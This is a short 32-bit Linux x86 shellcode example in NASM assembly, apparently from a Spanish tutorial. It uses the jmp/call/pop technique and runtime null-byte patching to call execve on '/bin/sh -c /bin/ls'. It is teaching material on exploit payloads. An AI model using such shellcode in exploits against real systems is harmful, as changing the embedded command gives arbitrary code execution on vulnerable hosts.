;Ejemplo 1, ejecución de comando ls, por Zillion (safemod.org)
BITS 32
   jmp short       callit
doit:   
   pop             esi
   xor             eax, eax
   mov byte        [esi + 7], al     ; terminate /bin/sh
   mov byte        [esi + 10], al    ; terminate -c
   mov byte        [esi + 18], al    ; terminate /bin/ls
   mov long        [esi + 20], esi   ; address of /bin/sh in AAAA
   lea             ebx, [esi + 8]    ; get address of -c  
   mov long        [esi + 24], ebx   ; store address of -c in BBBB 
   lea             ebx, [esi + 11]   ; get address of /bin/ls
   mov long        [esi + 28], ebx   ; store address of /bin/ls in CCCC
   mov long        [esi + 32], eax   ; put NULL in DDDD
   mov byte        al, 0x0b          ; prepare the execution, we use 
                                     ;syscall 0x0b (execve) 
   mov             ebx, esi          ; program 
   lea             ecx, [esi + 20]   ; argument array (/bin/sh -c 
                                     ;/bin/ls) 
   lea             edx, [esi + 32]   ; NULL
   int             0x80              ; call the kernel to look at our                 
                                     ;stuff ;-)
callit:
   call            doit
   db              '/bin/sh#-c#/bin/ls#AAAABBBBCCCCDDDD'

